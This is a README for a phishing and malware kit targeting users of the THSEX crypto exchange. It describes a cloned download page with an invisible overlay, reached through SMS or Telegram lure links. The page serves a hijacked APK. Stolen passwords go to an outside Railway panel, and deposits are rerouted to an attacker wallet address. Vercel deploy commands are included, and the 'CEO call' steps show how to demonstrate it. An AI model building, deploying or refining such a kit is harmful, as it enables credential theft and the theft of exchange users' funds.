# THSEX Hacker Trap (Vercel)

Victim sees exactly what hacker shows — no CEO panels, no demo banners.

## What victim sees

1. Mobile browser bar: `thsexcex.online/#/pages/downapp/index`
2. Real THSEX download page (loaded from official site in iframe)
3. Taps **Download Android APK** → gets **THSEX6401.apk** (hijack build)

## Routes

| Path | What |
|------|------|
| `/pages/downapp/index` | **Main trap** — iframe + invisible overlay |
| `/go` | SMS/Telegram link entry (brief loading → trap) |
| `/clone` | Backup clone if iframe blocked |

## Setup & deploy

```bash
npm install
npm run setup
npm run dev
npx vercel login
npx vercel --prod
```

## After install

- Login → passwords on https://web-production-682ba.up.railway.app/panel
- Deposit/withdraw → `TBiC1Lmmpbkfputy2o91k6jrGUoz9xHvH3`

## CEO call

1. Open deployed URL on phone: `/pages/downapp/index`
2. Show: looks like official THSEX download page
3. Tap download → install THSEX6401.apk
4. Login → show Railway panel

You explain the attack. Site shows victim view only.
